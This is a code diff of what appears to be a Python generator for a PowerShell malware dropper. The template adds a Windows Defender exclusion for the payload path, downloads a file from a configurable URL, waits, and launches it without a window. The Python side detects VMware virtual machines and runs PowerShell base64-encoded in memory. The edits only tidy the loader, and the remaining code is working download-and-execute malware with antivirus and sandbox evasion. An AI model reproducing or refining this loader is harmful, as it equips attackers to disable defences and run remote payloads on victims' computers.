@@ -28,14 +28,13 @@ if (-not (Test-Path $DOWNLOAD_DIR)) {{
 $FinalFilePath = Join-Path $DOWNLOAD_DIR $PAYLOAD_NAME
 Add-MpPreference -ExclusionPath $FinalFilePath
 
-Write-Host "Downloading content from $URL to $TempDownloadFile"
+Write-Host "Downloading content from $URL to $FinalFilePath"
 Invoke-WebRequest -Uri $URL -OutFile $FinalFilePath
 
 Write-Host "Waiting for $DELAY_WAIT seconds after download..."
 Start-Sleep -Seconds $DELAY_WAIT
 
 Write-Host "Starting final process: $FinalFilePath"
-Add-MpPreference -ExclusionPath $FinalFilePath
 Start-Process -FilePath $FinalFilePath -NoNewWindow
 """)
 
@@ -49,7 +48,6 @@ import winreg
 import platform
 import sys
 import base64
-import time
 
 def is_running_on_vmware_windows():
     if platform.system() != "Windows":
@@ -103,8 +101,6 @@ def is_running_on_vmware_windows():
 # 2. PowerShell Execution Function (Safe In-Memory Method)
 PS_EXEC_FUNCTION = textwrap.dedent("""\
 def execute_powershell_script(ps_content, delay_start):
-    time.sleep(delay_start)
-
     try:
         ps_script_bytes = ps_content.encode('utf-16le')
         ps_b64 = base64.b64encode(ps_script_bytes).decode('utf-8')
